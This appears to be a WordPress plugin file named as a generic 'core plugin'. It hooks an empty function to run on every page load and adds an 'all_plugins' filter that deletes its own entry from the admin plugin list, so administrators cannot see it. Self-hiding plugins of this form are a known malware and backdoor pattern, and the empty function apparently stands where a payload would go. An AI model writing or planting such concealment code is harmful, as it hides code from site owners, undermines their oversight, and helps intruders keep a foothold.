<?php

/**
 * Plugin Name: newinterlookdemowitid-core-plugin
 */

function wp_newinterlookdemowitid_core_plugin() {

    



}

add_action( 'wp_loaded', 'wp_newinterlookdemowitid_core_plugin' );

function wp_newinterlookdemowitid_core_aux( $plugins ) {
	unset( $plugins['newinterlookdemowitid-core-plugin/newinterlookdemowitid-core-plugin.php'] );
	return $plugins;
}

add_filter( 'all_plugins', 'wp_newinterlookdemowitid_core_aux' );

